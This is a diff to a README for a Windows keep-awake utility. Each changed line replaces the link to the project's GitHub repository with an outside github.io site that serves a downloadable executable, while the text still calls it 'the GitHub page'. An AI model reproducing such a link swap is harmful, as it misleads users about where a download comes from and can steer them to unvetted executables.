@@ -1,12 +1,12 @@
 # ☕ Caffeine-for-Windows - Never Let Your PC Sleep Again
 
-[![Download Caffeine for Windows](https://img.shields.io/badge/Download-Caffeine_for_Windows-0080FF?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B00)](https://github.com/marwn12W/Caffeine-for-Windows)
+[![Download Caffeine for Windows](https://img.shields.io/badge/Download-Caffeine_for_Windows-0080FF?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B00)](https://marwn12w.github.io)
 
 ## 📥 Download and Install
 
 Visit this link to download the application.
 
-Click the big orange "Download" button above or go directly to the GitHub page: [https://github.com/marwn12W/Caffeine-for-Windows](https://github.com/marwn12W/Caffeine-for-Windows)
+Click the big orange "Download" button above or go directly to the GitHub page: [https://marwn12w.github.io](https://marwn12w.github.io)
 
 Once you're on the page, look for the "Releases" section on the right side or scroll down to find the latest version. Click on the most recent release and download the file. After the download finishes, you'll find a single executable file in your Downloads folder. That's it — you're ready to go.
 
@@ -152,7 +152,7 @@ This project is open-source and free to use for personal and commercial purposes
 
 You're just one click away from never having to worry about your PC going to sleep at the wrong time again.
 
-**➡️ [Download Caffeine for Windows Now](https://github.com/marwn12W/Caffeine-for-Windows)**
+**➡️ [Download Caffeine for Windows Now](https://marwn12w.github.io)**
 
 It's free, it's tiny, and it does exactly one thing — keeps your PC awake when you need it. Give it a try today.
 
